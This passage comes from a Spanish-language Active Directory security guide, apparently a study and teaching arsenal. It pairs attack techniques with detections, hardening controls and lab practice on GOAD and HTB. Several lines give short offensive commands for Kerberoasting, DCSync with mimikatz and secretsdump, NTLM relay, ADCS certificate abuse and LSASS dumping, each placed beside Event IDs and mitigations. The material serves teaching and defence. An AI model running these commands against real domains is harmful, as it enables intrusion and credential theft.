| **Auditoría avanzada Windows** | Advanced Audit Policy (GPO) | Subcategorías a activar (Success+Failure): *Kerberos Auth Service*, *Kerberos Service Ticket Ops*, *Credential Validation*, *Logon/Logoff*, *DS Access → Directory Service Changes* (habilita 5136), *Object Access → File Share* (5140/5145), *Detailed Tracking → Process Creation* (4688 + línea de comando vía GPO) |
| **PowerShell logging** | GPO | **ScriptBlock Logging** (4104) + **Module Logging** + Transcription |
| **AD / Kerberos / PKI** | DC + CA | Auditar replicación (para DCSync), subir verbosidad LDAP con `15 Field Engineering` en registry para spotear queries pesadas (BloodHound), auditoría en la CA (AD CS) para 4886/4887 |
| **SIEM / colección** | **Wazuh** (open, con reglas y agente), **Splunk Free** (500 MB/día, ideal lab chico) o **ELK/Elastic** (Elastic Agent + reglas SIEM detection) | Winlogbeat/Elastic Agent o el agente Wazuh reenvían Security + Sysmon |

> Mínimo viable de lab: 1 DC + 1 workstation + Sysmon con config de Olaf + Winlogbeat → ELK, o el agente Wazuh. Con eso ya detectás el 80% de lo de §1.

---

##### 6. Atomic Red Team + loop Purple Team

**Atomic Red Team** (Red Canary): biblioteca de "atomics" — tests chiquitos y atómicos mapeados 1:1 a técnicas ATT&CK, ejecutables con el runner **Invoke-AtomicRedTeam** en PowerShell. Sirven para **validar que tu detección dispara**, no para pentestear de verdad.

Comando ilustrativo: `Invoke-AtomicTest T1558.003` (ejecuta el atomic de Kerberoasting) — siempre en lab, con `-CheckPrereqs` primero y `-Cleanup` después.

**Loop Purple Team (el ciclo que enseñás en pizarra):**
1. **Emular** — corrés el atomic de la técnica (ej. `T1550.002` PtH).
2. **Observar** — ¿generó el Event ID esperado? (ej. 4624 Type 3 + NTLM).
3. **Detectar** — ¿tu regla Sigma/SIEM disparó?
4. **Ajustar** — si no disparó: falta subcategoría de auditoría, o la regla tiene mal el campo, o falta telemetría (¿Sysmon 10 sobre LSASS?).
5. **Documentar** — pintás la técnica en ATT&CK Navigator (verde) y anotás el FP rate.
6. Repetís con la siguiente técnica → tu heatmap se va llenando.

---

##### 7. Tabla maestra: ataque → detección (gemelo defensivo)

| Ataque (1 línea) | Cómo (tool + comando mínimo) | Detección (Event ID / Sysmon) | ATT&CK | Mitigación |
|---|---|---|---|---|
| **Kerberoasting** — pedir TGS de cuentas con SPN y crackear offline | Rubeus `kerberoast` / Impacket `GetUserSPNs.py -request` | **4769** RC4 (`0x17`) masivo desde un host; honey SPN = FP casi 0 | T1558.003 | gMSA (pwd largo aleatorio auto-rotado), AES-only, quitar SPN innecesarios |
| **AS-REP Roasting** — cuentas sin pre-auth, hash crackeable | Impacket `GetNPUsers.py` / Rubeus `asreproast` | **4768** con `Pre-Auth Type 0` / RC4 | T1558.004 | Quitar `DONT_REQ_PREAUTH`; passwords fuertes |
| **Password spraying** — 1 pwd contra muchos users | Kerbrute / `spray.sh` | **4625** / **4771** distribuidos + **4776** en DC | T1110.003 | Lockout inteligente, MFA, monitoreo de tasa de fallo |
| **Pass-the-Hash** — autenticar con el NT hash | Mimikatz `sekurlsa::pth` / Impacket `-hashes` | **4624** Type 3 + NTLM; **4648**; Sysmon **10** sobre `lsass.exe` | T1550.002 | Credential Guard, LAPS, tiering de admins, deshabilitar NTLM donde se pueda |
| **Pass-the-Ticket** — reusar TGT/TGS robado | Rubeus `ptt` / Mimikatz `kerberos::ptt` | Anomalía en **4768/4769**; TGT usado desde IP/host inesperado | T1550.003 | Protected Users group, límites de lifetime de ticket, reset de `krbtgt` x2 |
| **DCSync** — pedir replicación al DC y sacar hashes | Mimikatz `lsadump::dcsync` / Impacket `secretsdump -just-dc` | **4662** con GUID de `Replicating Directory Changes` desde host no-DC | T1003.006 | Revisar quién tiene `Replicating Directory Changes` en el DACL del dominio; SACL de auditoría |
| **Abuso de ACL / RBCD** — escribir atributos para escalar | PowerView `Add-DomainObjectAcl` / `rbcd.py` | **5136** sobre `nTSecurityDescriptor` o `msDS-AllowedToActOnBehalfOf…`; **4738** | T1098 | Auditar DACLs con BloodHound (¡vos primero!), remediar ACEs peligrosas |
| **PsExec / ejecución remota** — servicio efímero como SYSTEM | Impacket `psexec.py` / Sysinternals PsExec | **7045** servicio random; **5145** `\ADMIN$`; Sysmon **1**+**3** | T1569.002 | Restringir SMB admin, segmentar, alertar servicios nuevos |
| **Creación/escalada de cuenta** — persistencia y priv | `net user /add` + `net group "Domain Admins" /add` | **4720** + **4728**/**4732**; **4724** si es reset | T1136 / T1098 | Alertar cambios en grupos priv, revisión periódica de membresías |
| **Limpieza de logs** — borrar rastro | `wevtutil cl Security` / Mimikatz | **1102** (Security) / **104** (System) | T1070.001 | Forward inmediato de logs a SIEM (WEF/agent), append-only, alerta crítica en 1102 |
| **AD CS ESC1/ESC6** — cert con SAN alterno = suplantar admin | Certipy `req` / Certify | **4886/4887** en la CA; correlacionar template + SAN | T1649 | Deshabilitar `ENROLLEE_SUPPLIES_SUBJECT`, restringir enrollment, monitorear plantillas |

---

**Cierre de pizarra:** el pentester ofensivo del grupo aporta los atomics y los IOCs "desde adentro"; el blue los transforma en reglas Sigma versionadas y en verde sobre el Navigator. Un hallazgo no está "cerrado" hasta que existe la detección que lo hubiera atrapado.

---

## 15. 🧱 Hardening AD — baseline defensivo

> **Encuadre:** checklist que un pentester recomienda y un blue team implementa. Cada fila liga un **control** al **ataque que neutraliza**. Aplicar y probar SOLO en lab propio / HTB / engagement con permiso escrito. Los comandos son ilustrativos (pizarra/entrevista), no copy-paste de operación.

---

**Cómo leer esto:** por cada control va (a) qué es, (b) el ataque ofensivo que mata con herramienta + 1 comando mínimo, (c) detección (Event ID Windows Security / Sysmon), (d) MITRE ATT&CK, (e) mitigación/estado objetivo.

---

##### 1. Tiering / Enterprise Access Model + PAW

| Campo | Detalle |
|---|---|
| Qué es | Separar identidades en niveles (Tier 0 = DCs/AD/PKI, Tier 1 = servidores, Tier 2 = workstations). Los admins de Tier 0 solo inician sesión desde **PAW** (estación dedicada, sin correo/navegación). |
| Ataque que mata | **Credential hopping / lateral movement**: un admin de dominio que inicia sesión en un workstation Tier 2 deja su TGT/cred en memoria → `mimikatz sekurlsa::logonpasswords` o `pth`. El tiering impide que esa credencial toque un host de menor confianza. |
| Comando ilustrativo | `Rubeus.exe triage` (enumera tickets cacheados en el host) — evidencia de por qué no querés un TGT de DA en un host de usuario. |
| Detección | **4624** (logon) correlacionado por `LogonType` + membresía Tier 0; **4672** (Special privileges assigned) en hosts que NO deberían ver cuentas privilegiadas = violación de tiering. |
| MITRE | T1078.002 (Valid Accounts: Domain), T1550.002 (Pass the Hash), T1550.003 (Pass the Ticket) |
| Mitigación | Enterprise Access Model + PAW; **Authentication Silos** (ver §9) que fuerzan a que las cuentas Tier 0 solo autentiquen contra hosts Tier 0. |

##### 2. LAPS — rotación de local admin

| Campo | Detalle |
|---|---|
| Qué es | Windows LAPS rota la contraseña del administrador local de cada equipo, única por host, guardada cifrada en AD (`msLAPS-EncryptedPassword` en Windows LAPS moderno; `ms-Mcs-AdmPwd` en LAPS legacy). |
| Ataque que mata | **Pass-the-Hash del admin local reutilizado**: si todos los hosts comparten el mismo hash de admin local, un solo dump habilita PtH a toda la flota. `crackmapexec smb <rango> -u Administrator -H <hash> --local-auth`. |
| Comando ilustrativo | Lectura legítima del secreto (si tenés derechos delegados): `Get-LapsADPassword -Identity HOST01 -AsPlainText`. Del lado ofensivo, leer `ms-Mcs-AdmPwd` con permisos mal delegados: `pyLAPS.py --action get`. |
| Detección | **4662** (operación sobre objeto AD) sobre el atributo LAPS = lectura de la contraseña; requiere SACL de auditoría sobre el atributo. Auditar quién lee `ms-Mcs-AdmPwd`/`msLAPS-EncryptedPassword`. Lecturas anómalas/masivas = recon. |
| MITRE | T1078.003 (Local Accounts), T1550.002 (Pass the Hash), T1555 (Credentials from Password Stores) |
| Mitigación | Windows LAPS (built-in desde Win10/11 y Server 2019+ con updates), backup cifrado en AD, delegación de lectura mínima y auditada. |

##### 3. gMSA — cuentas de servicio (mata Kerberoasting)

| Campo | Detalle |
|---|---|
| Qué es | Group Managed Service Account: contraseña de 120+ chars gestionada y rotada por AD cada 30 días, no la conoce ningún humano. |
| Ataque que mata | **Kerberoasting**: pedir TGS de una cuenta con SPN y crackear offline el hash cifrado con la clave de la cuenta. Con gMSA el crackeo es inviable. `Rubeus.exe kerberoast /nowrap`. |
| Comando ilustrativo | `Get-ADServiceAccount -Filter *` para inventariar gMSA. Ofensivo/lab: `GetUserSPNs.py -request <dom>/<user>` (Impacket) muestra qué SPNs son crackeables. |
| Detección | **4769** (Kerberos service ticket requested) con `Ticket Encryption Type 0x17` (RC4) y alto volumen desde una cuenta = roasting. Con AES-only (§4), un 0x17 ya es anómalo. |
| MITRE | T1558.003 (Kerberoasting) |
| Mitigación | Migrar cuentas de servicio con SPN a **gMSA/dMSA**; donde no se pueda, password ≥25 chars aleatoria + AES. |

##### 4. Kerberos AES-only (deshabilitar RC4)

| Campo | Detalle |
|---|---|
| Qué es | Forzar `msDS-SupportedEncryptionTypes` a AES128/AES256 y quitar RC4-HMAC (0x17) y DES. |
| Ataque que mata | **Kerberoasting/AS-REP roasting acelerados por RC4** (el hash RC4 crackea mucho más rápido que AES) y **downgrade a RC4**. |
| Comando ilustrativo | `Set-ADUser <svc> -KerberosEncryptionType AES128,AES256`. Ofensivo: `Rubeus.exe asreproast /nowrap` (contra cuentas sin preauth). |
| Detección | **4769**/**4768** con `Encryption Type 0x17` tras haber migrado a AES = intento de downgrade o cuenta rezagada. |
| MITRE | T1558.003 (Kerberoasting), T1558.004 (AS-REP Roasting) |
| Mitigación | AES-only en el dominio; deshabilitar RC4 por GPO **tras** inventariar dependencias (apps legacy, trusts). |

##### 5. NTLM: matar NTLMv1 y restringir NTLM

| Campo | Detalle |
|---|---|
| Qué es | Deshabilitar NTLMv1/LM y auditar→restringir NTLM (mover a Kerberos). NTLMv1 es crackeable a NTLM hash vía DES. |
| Ataque que mata | **NTLMv1 downgrade + crack** (ej. capturar respuesta NetNTLMv1 y romperla en crack.sh) y uso de NTLM para relay/pass-the-hash. `responder -I eth0` para captura en lab. |
| Comando ilustrativo | GPO: `Network security: LAN Manager authentication level = Send NTLMv2 response only. Refuse LM & NTLM (nivel 5)`. |
| Detección | **4624**/**4776** con paquete de autenticación NTLM v1; **8004** en el log *NTLM Operational* (lado DC: auditoría/bloqueo de NTLM en el dominio). |
| MITRE | T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay), T1187 (Forced Authentication) |
| Mitigación | LMCompatibilityLevel 5; políticas *Restrict NTLM*; deshabilitar LLMNR/NBT-NS/mDNS por GPO. |

##### 6. Anti-relay: EPA + SMB/LDAP signing + channel binding

| Campo | Detalle |
|---|---|
| Qué es | Firma SMB obligatoria, LDAP signing + **LDAP channel binding**, y **EPA** (Extended Protection for Authentication) en servicios HTTP (ADCS web enrollment, OWA, etc.). Todos atan el canal TLS a la autenticación → el relay pierde validez. |
| Ataque que mata | **NTLM relay** (SMB→LDAP, HTTP→LDAP): `ntlmrelayx.py -t ldap://dc --escalate-user` o `-t http://ca/certsrv/certfnsh.asp` (ESC8). El signing/binding rompe la retransmisión. |
| Comando ilustrativo | `ntlmrelayx.py -tf targets.txt -smb2support` (lab). Defensa: `Domain controller: LDAP server signing requirements = Require signing`. |
| Detección | **2889**/**2887** en el DC (log *Directory Service*): 2889 identifica IP+cuenta que hace bind LDAP sin firma / simple bind sin SSL, 2887 es el resumen diario de binds no firmados; picos de **4624** LogonType 3 desde un host relay hacia varios destinos. |
| MITRE | T1557.001 (SMB relay), T1187 (Forced Authentication) |
| Mitigación | SMB signing *required*, LDAP signing *required* + channel binding *required*, EPA en todos los servicios HTTP/AD (incluido ADCS). |

##### 7. Parches de coerción (PetitPotam / SpoolSample)

| Campo | Detalle |
|---|---|
| Qué es | Cerrar los vectores que **fuerzan** a una máquina (típicamente el DC) a autenticarse contra un host controlado por el atacante, que luego se relaya. |
| Ataque que mata | **PetitPotam** (MS-EFSRPC), **PrinterBug/SpoolSample** (MS-RPRN), **DFSCoerce** (MS-DFSNM), **ShadowCoerce** (MS-FSRVP). `petitpotam.py <attacker> <dc>` / `printerbug.py <dom>/<user>@<dc> <attacker>` / `Coercer coerce`. |
| Comando ilustrativo | Mitigación Print Spooler: deshabilitar el servicio en DCs, o GPO `RegisterSpoolerRemoteRpcEndPoint = 2` (deshabilita el endpoint RPC remoto). |
| Detección | **5145** (A network share object was checked) sobre `\PIPE\lsarpc`/`\PIPE\efsrpc`/`\PIPE\spoolss`; **4624** del *machine account* del DC autenticándose hacia un host no-DC. |
| MITRE | T1187 (Forced Authentication) |
| Mitigación | KBs de EFSRPC/PetitPotam aplicados; Spooler deshabilitado en DCs; combinar SIEMPRE con anti-relay (§6) — el parche solo no basta. |

##### 8. MachineAccountQuota = 0

| Campo | Detalle |
|---|---|
| Qué es | Impedir que usuarios sin privilegio unan cuentas de equipo al dominio (`ms-DS-MachineAccountQuota` por defecto = 10). |
| Ataque que mata | **RBCD** (Resource-Based Constrained Delegation abuse) y **noPac (CVE-2021-42278/42287)**, que requieren crear una cuenta de máquina. `addcomputer.py -computer-name EVIL$ ...` (Impacket). |
| Comando ilustrativo | `Set-ADDomain -Identity <dom> -Replace @{"ms-DS-MachineAccountQuota"="0"}`. |
| Detección | **4741** (A computer account was created) por una cuenta de usuario no-admin = red flag; **4742** (computer account changed) para escrituras de `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD). |
| MITRE | T1558 (Steal or Forge Kerberos Tickets), T1078.002 (Domain Accounts) |
| Mitigación | MAQ=0; delegar el join a un grupo específico; parchear noPac. |

##### 9. Protected Users + Authentication Policies/Silos

| Campo | Detalle |
|---|---|
| Qué es | Grupo **Protected Users** (no cachea creds NTLM/DES/RC4, no delegación, TGT de 4h). **Authentication Silos + Policies** confinan cuentas Tier 0 a hosts Tier 0. |
| Ataque que mata | **Pass-the-Hash / OverPass-the-Hash / delegación** de cuentas privilegiadas: sin hash NTLM cacheado no hay PtH; el silo impide usar el ticket fuera de los hosts autorizados. `mimikatz sekurlsa::pth`. |
| Comando ilustrativo | `Add-ADGroupMember -Identity "Protected Users" -Members <DA>`. |
| Detección | **4768** con TTL reducido; **4820**/**4821** (Kerberos TGT/service ticket denegado por Authentication Policy/silo) = intento de usar cuenta Tier 0 fuera del silo. |
| MITRE | T1550.002 (Pass the Hash), T1550.003 (Pass the Ticket) |
| Mitigación | Meter todas las cuentas admin en Protected Users + Authentication Silos; validar que apps legacy no rompan (NTLM/RC4 quedan cortados). |

##### 10. ADCS hardening (mata ESC1–ESC8+)

| Campo | Detalle |
|---|---|
| Qué es | Endurecer la PKI: **strong certificate mapping** (KB5014754 en modo **Full Enforcement**), quitar el flag **EDITF_ATTRIBUTESUBJECTALTNAME2**, restringir *enrollment rights* de templates y proteger el **web enrollment**. |
| Ataque que mata | **ESC1** (template permite SAN arbitrario), **ESC2/3**, **ESC6** (EDITF_ATTRIBUTESUBJECTALTNAME2 = SAN inyectable), **ESC8** (relay a web enrollment). `certipy find -vulnerable` / `certipy req -template <t> -upn administrator@dom`. |
| Comando ilustrativo | Auditoría: `Certify.exe find /vulnerable`. Defensa ESC6: quitar el flag en la CA con `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`. |
| Detección | **4886/4887** (Certificate Services received/approved a request) correlacionados con solicitante vs SAN emitido (SAN que no coincide = sospechoso); **4768** (TGT) autenticado con certificado emitido de forma anómala. |
| MITRE | T1649 (Steal or Forge Authentication Certificates) |
| Mitigación | Full Enforcement (mapeo fuerte cert↔cuenta, KB5014754); sin EDITF_ATTRIBUTESUBJECTALTNAME2; enrollment rights mínimos, manager approval en templates sensibles; EPA + HTTPS-only en `certsrv`. |

##### 11. Credential Guard + LSASS PPL

| Campo | Detalle |
|---|---|
| Qué es | **Credential Guard** aísla secretos (NTLM hashes, TGT) en VBS/VSM; **LSASS como PPL** (RunAsPPL) impide que procesos no-protegidos lean su memoria. |
| Ataque que mata | **LSASS dumping**: `mimikatz sekurlsa::logonpasswords`, `procdump -ma lsass.exe`, `comsvcs.dll MiniDump`. CredGuard vacía lo que se puede robar; PPL bloquea el `OpenProcess`. |
| Comando ilustrativo | Defensa: GPO/registro `RunAsPPL = 1`. Ofensivo (lab): `procdump.exe -accepteula -ma lsass.exe out.dmp`. |
| Detección | **Sysmon Event ID 10** (ProcessAccess) hacia `lsass.exe` con `GrantedAccess 0x1010`/`0x1410` desde un proceso no-firmado; **4656/4663** sobre el objeto LSASS. |
| MITRE | T1003.001 (OS Credential Dumping: LSASS Memory) |
| Mitigación | Credential Guard (VBS) + RunAsPPL en todos los endpoints que lo soporten; EDR con protección de LSASS. |

##### 12. Monitoreo de atributos sensibles + rotación de krbtgt + backups

| Campo | Detalle |
|---|---|
| Qué es | Auditar cambios en atributos/objetos de alto valor (membresías privilegiadas, ACLs, `AdminSDHolder`, GPO); **rotar krbtgt** (2× con ventana ≥10h/máx TGT life) para invalidar Golden Tickets; **backups de AD** offline/inmutables + plan de forest recovery probado. |
| Ataque que mata | **DCSync** (`mimikatz lsadump::dcsync /user:krbtgt`), **Golden Ticket** (forjar TGT con hash krbtgt — la rotación lo invalida), **DCShadow**, **AdminSDHolder/ACL backdoors**, y ransomware sobre DCs (backup + recovery). |
| Comando ilustrativo | Rotación segura: script **New-KrbtgtKeys.ps1** (Microsoft) ejecutado 2 veces con la ventana requerida. Ofensivo: `Rubeus.exe golden /rc4:<krbtgt-hash> ...`. |
| Detección | **4662** con GUID de control access `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes) / `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes-All) = **replicación (DCSync)** desde un principal que no es DC; **4728/4732/4756** (add a grupo privilegiado global/local/universal); **5136** (objeto de directorio modificado) sobre GPO/AdminSDHolder. |
| MITRE | T1003.006 (DCSync), T1558.001 (Golden Ticket), T1207 (DCShadow / Rogue Domain Controller), T1484 (Domain Policy Modification) |
| Mitigación | Rotación krbtgt periódica y post-incidente; alertar DCSync desde no-DCs; backups inmutables + runbook de forest recovery ensayado. |

---

**Regla de oro del arsenal:** ningún control vive solo. Anti-relay (§6) + parches de coerción (§7) van juntos; AES-only (§4) + gMSA (§3) juntos; Protected Users (§9) + tiering/PAW (§1) juntos. Un pentester valida el baseline **atacándolo** en un entorno autorizado y midiendo qué Event IDs realmente dispara el SIEM.

---

## 16. 🎯 Práctica — GOAD + escalera HTB de AD

> **Alcance legal:** todo lo de abajo se practica SOLO en lab propio (GOAD), en HTB/THM (retirados) o en engagement con autorización escrita. Ningún objetivo vivo. Este es el "kernel-lab de AD": el hueco #1 es práctico (0 boxes de AD cerrados), y se cierra con repetición offline.

---

##### 1. GOAD — Game of Active Directory (Orange Cyberdefense, @M4yFly)

Bosque multi-DC deliberadamente vulnerable. Es tu banco de pruebas de AD **sin VPN, offline, reseteable**: rompés, snapshoteás, y volvés a intentar el mismo ataque hasta que sale a ciegas.

| Escenario | Tamaño | Qué entrena |
|---|---|---|
| **GOAD** (full) | ~5 VMs, 2 bosques / 3 dominios | Cadena completa: delegaciones, trusts entre bosques, ADCS, MSSQL links, ACL abuse. El "boss fight". |
| **GOAD-Light** | 2–3 VMs, 1 bosque | Fundamentos: Kerberoast, AS-REP, GPP, ACLs. Arranque rápido en hardware modesto. |
| **MINILAB** | 2 VMs (1 DC + 1 WS) | Setup mínimo para validar tooling (BloodHound, NetExec, Certipy) antes de escalar. |
| **SCCM / MECM** | 4 VMs | Abuso de Configuration Manager (NAA creds, PXE, site takeover). |
| **NHA** (Ninja Hacker Academy) | 5 VMs, 2 dominios, **sin diagrama** | Simulacro de examen/engagement: Defender activo, sin guía. Objetivo: DA en ambos dominios a ciegas. |

**Cómo se deploya** (elegir 1):

| Vía | Comando ilustrativo | Notas |
|---|---|---|
| **Ludus** (recomendado) | `ludus range config set -f goad.yml` → `ludus range deploy` | Sobre Proxmox; Packer+Ansible; el camino de menor fricción. |
| **Vagrant + VirtualBox/VMware** | `./goad.sh -t install -l GOAD -p virtualbox` | Local, sin servidor Proxmox. Pide bastante RAM (32 GB+ para el full). |
| **Proxmox / AWS / Azure** | provider en `goad.sh` (`-p proxmox` / `aws` / `azure`) | Para labs compartidos con el grupo. |

> **Disciplina de lab:** snapshot limpio de cada VM antes de atacar → así repetís la técnica N veces. Igual que `dbg.sh` en kernel-lab: el valor está en la repetición barata.

---

##### 2. Escalera HTB de AD (retiradas) — box → técnica → dificultad

Ordenadas para construir la cadena de a poco. Todas retiradas (se practican con suscripción; writeups permitidos).

| # | Box | Dif. | Cadena principal (técnica que enseña) |
|---|---|---|---|
| 1 | **Forest** | Fácil | AS-REP Roast → ACL abuse (WriteDacl vía Exchange Windows Permissions) → **DCSync** |
| 2 | **Sauna** | Fácil | AS-REP Roast → creds de **autologon** en registro Winlogon → DCSync (svc_loanmgr) |
| 3 | **Active** | Fácil | **GPP cpassword** en SYSVOL → **Kerberoast** al Administrator |
| 4 | **Return** | Fácil | Panel de impresora → captura de **creds LDAP** (rogue LDAP) → abuso de servicio (Server Operators) |
| 5 | **Support** | Fácil | Enum LDAP (attr `info`) → **RBCD** (GenericAll sobre el objeto del DC) |
| 6 | **Cascade** | Media | Enum LDAP (`cascadeLegacyPwd`) → **TightVNC** (password en registro, clave fija) → **AD Recycle Bin** → recuperación de creds |
| 7 | **Escape** | Media | MSSQL (xp_dirtree, captura NetNTLMv2) → creds en logs → **ADCS ESC1** (Certipy) |
| 8 | **Certified** | Media | ACL chain → **Shadow Credentials** → **ADCS ESC9** |
| 9 | **Administrator** | Media | Assumed breach → ACL abuse → **targeted Kerberoast** → DCSync |
| 10 | **Blackfield** | Difícil | AS-REP Roast → ForceChangePassword → **LSASS dump** (dmp en share) → **NTDS.dit** (SeBackupPrivilege) |

Ruta sugerida: 1→2→3 (fundamentos) · 4→5→6 (LDAP/ACL/creds) · 7→8→9 (ADCS/shadow) · 10 (encadenar todo).

---

##### 3. Cada técnica ofensiva + su gemelo blue-team

Para cada una: **qué es → cómo (tool + comando mínimo) → detección (Event ID) → ATT&CK → mitigación**.

**AS-REP Roasting** — pedir el AS-REP de una cuenta con pre-auth Kerberos deshabilitada y crackear offline.
- Cómo: `GetNPUsers.py dom/ -usersfile users.txt -no-pass` → `hashcat -m 18200`
- Detección: **4768** (TGT solicitado) con `Pre-Auth Type=0` y enc RC4 (`0x17`).
- ATT&CK: **T1558.004**
- Mitigación: no dejar `DONT_REQ_PREAUTH`; passwords largas; auditar la flag periódicamente.

**Kerberoasting** — pedir TGS de cuentas con SPN y crackear la contraseña de servicio offline.
- Cómo: `GetUserSPNs.py dom/user -request` → `hashcat -m 13100`
- Detección: **4769** (TGS solicitado) con enc RC4 (`0x17`), volumen anómalo desde un host.
- ATT&CK: **T1558.003**
- Mitigación: gMSA (passwords de 120+ chars), AES-only, quitar SPN innecesarios.

**GPP cpassword** — password AES en `Groups.xml` de SYSVOL con clave publicada por Microsoft.
- Cómo: `Get-GPPPassword` (PowerSploit) / `nxc smb <dc> -M gpp_password` o `gpp-decrypt <cpassword>`
- Detección: **4663** (acceso a `Groups.xml` en SYSVOL) con SACL en NETLOGON/SYSVOL.
- ATT&CK: **T1552.006**
- Mitigación: parche **MS14-025 / KB2962486**; purgar GPPs viejas con cpassword.

**DCSync** — pedir replicación de secretos al DC como si fueras otro DC (hashes/krbtgt).
- Cómo: `secretsdump.py dom/user@dc -just-dc` o `lsadump::dcsync /user:krbtgt`
- Detección: **4662** con GUID de replicación `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`) desde un principal que NO es DC (requiere SACL en el objeto de dominio).
- ATT&CK: **T1003.006**
- Mitigación: minimizar quién tiene los derechos de replicación; alertar 4662 con esos GUIDs.

**Abuso de ACL (WriteDacl / GenericAll / ForceChangePassword)** — reescribir permisos u objetos para escalar (base de Forest, Support, Certified, Administrator).
- Cómo: BloodHound para el path → `bloodyAD --host dc -d dom -u u -p p add genericAll <obj> <me>` / `net rpc password`
- Detección: **5136** (objeto de DS modificado: `nTSecurityDescriptor`) / **4738** (cuenta modificada) / **4724** (reset de password).
- ATT&CK: **T1098**
- Mitigación: tiered admin, revisar ACLs con BloodHound en defensa, quitar derechos heredados excesivos.

**RBCD (Resource-Based Constrained Delegation)** — escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` para suplantar vía S4U.
- Cómo: `rbcd.py -delegate-to 'DC$' -action write dom/user -delegate-from 'EVIL$'` → `getST.py -impersonate Administrator`
- Detección: **5136** (modificación de `msDS-AllowedToActOnBehalfOfOtherIdentity`) + **4769** (S4U2Proxy).
- ATT&CK: **T1098** (escritura del atributo de delegación)
- Mitigación: `msDS-MachineAccountQuota=0`; proteger cuentas sensibles con "Account is sensitive and cannot be delegated".

**Shadow Credentials** — inyectar una clave en `msDS-KeyCredentialLink` para autenticarte con PKINIT.
- Cómo: `certipy shadow auto -u user@dom -account victim` (o pyWhisker)
- Detección: **5136** (modificación de `msDS-KeyCredentialLink`).
- ATT&CK: **T1098** (manipulación de cuenta). *Nota: MITRE no tiene sub-técnica dedicada; a veces se registra bajo T1556 Modify Authentication Process.*
- Mitigación: restringir quién puede escribir `msDS-KeyCredentialLink` (revisar ACLs con BloodHound), monitorizar 5136 sobre ese atributo, Protected Users / deshabilitar PKINIT donde no se use. *(KB5014754 endurece el mapeo fuerte de certificados pero NO impide Shadow Credentials.)*

**ADCS ESC1** — template que permite SAN arbitrario + auth de cliente → pedir cert como Administrator.
- Cómo: `certipy req -ca CA -template Vuln -upn administrator@dom` → `certipy auth -pfx administrator.pfx`
- Detección: **4886/4887** en el CA (request/emisión de cert), UPN/SAN que no coincide con el solicitante.
- ATT&CK: **T1649**
- Mitigación: quitar `ENROLLEE_SUPPLIES_SUBJECT`, exigir aprobación del manager, restringir los derechos de enrollment del template. *(KB5014754 endurece el mapeo fuerte de certificados / otros ESC, no es el fix directo de ESC1.)*

**Creds en registro (autologon)** — `DefaultPassword` en `Winlogon` en texto claro (Sauna).
- Cómo: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` (o `nxc smb <dc> -M gpp_autologin` para la variante vía GPP)
- Detección: **Sysmon 13** (SetValue sobre `Winlogon`), 4663 sobre la clave.
- ATT&CK: **T1552.002**
- Mitigación: no usar autologon; si es imprescindible, LAPS/gMSA y rotación.

**Volcado de LSASS / backup + NTDS.dit** — extraer hashes de memoria o de la copia de NTDS (Blackfield).
- Cómo: `pypykatz lsa minidump lsass.dmp`; con `SeBackupPrivilege`: copiar `ntds.dit` + SYSTEM y `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
- Detección: **Sysmon 10** (ProcessAccess a `lsass.exe`, GrantedAccess `0x1010`/`0x1410`); **4673/4674** (uso de SeBackupPrivilege).
- ATT&CK: **T1003.001** (LSASS) / **T1003.003** (NTDS)
- Mitigación: Credential Guard, PPL en LSASS, ASR rules, restringir SeBackupPrivilege.

**Abuso de servicio (binPath / Server Operators)** — reconfigurar un servicio para ejecutar como SYSTEM (Return).
- Cómo: `sc config <svc> binPath= "C:\evil.exe"` → `sc start <svc>`
- Detección: **7045** (System: servicio instalado) / **4697** (Security) / **7040** (cambio de tipo de inicio del servicio).
- ATT&CK: **T1543.003**
- Mitigación: quitar de Server Operators; permisos de servicio mínimos; alertar 7045/4697.

**Captura de creds LDAP (rogue LDAP / device)** — forzar a un dispositivo (impresora) a autenticarse contra tu LDAP falso (Return).
- Cómo: `nc -lvp 389` / `sudo responder -I eth0` y disparar el "test connection" del panel.
- Detección: tráfico LDAP simple-bind saliente a host no autorizado; **4648** (logon con creds explícitas).
- ATT&CK: **T1187** (Forced Authentication)
- Mitigación: cuentas de servicio de dispositivos con mínimo privilegio; LDAPS + channel binding; segmentar VLAN de impresoras.

**Recon LDAP / creds en atributos (`info`, `description`, `cascadeLegacyPwd`)** — leer secretos guardados en atributos de AD (Support, Cascade).
- Cómo: `nxc ldap <dc> -u u -p p --users` (muestra el campo `description`) o `ldapsearch -x ... '(objectClass=user)' info`
- Detección: **1644** (búsqueda LDAP costosa; requiere habilitar el diagnóstico *Field Engineering*); picos de tráfico LDAP.
- ATT&CK: **T1552** (Unsecured Credentials — los atributos de directorio no encajan en una sub-técnica específica).
- Mitigación: nunca guardar passwords en atributos; auditar `description`/`info`; revisar AD Recycle Bin.

---

##### 4. TryHackMe (complemento guiado, barato)

| Ruta / room | Qué aporta |
|---|---|
| **Compromising / Attacking Active Directory** (path) | Kerberoast, AS-REP, delegación — guiado, bueno para el grupo que arranca. |
| **Defending Active Directory** / **AD Hardening** | El gemelo blue: tiering, LAPS, auditoría, detección. |
| **Wreath** | Red de 3 máquinas con pivoting + AD chico — puente hacia engagement real. |

---

##### 5. Disciplina de writeup (regla del arsenal)

Por CADA box cerrado, dos entregables gemelos (mismo estándar que los writeups de CTF ya subidos):

1. **Writeup ofensivo** — cadena reproducible + **Q&A de entrevista** ("¿qué es DCSync y qué permiso necesita?", "¿por qué RC4 en 4769 delata Kerberoast?").
2. **Gemelo blue-team** — por cada técnica usada: **Event ID que la delata + regla de detección (Sigma/KQL) + mitigación**. Esto es lo que te separa como docente: enseñás el ataque Y cómo se caza.

> Meta medible: cerrar la escalera 1→10 con writeup+gemelo de cada uno. Al terminar Blackfield tenés la cadena completa (AS-REP → LSASS/backup → NTDS vía SeBackupPrivilege) documentada de los dos lados.

---

## 17. 🧭 Pendientes del arsenal AD (crítico de completitud)

> Gaps que el pase de completitud marcó — próximas mejoras del arsenal.

Prioritizado por impacto en empleabilidad y por hueco real respecto a lo ya cubierto:

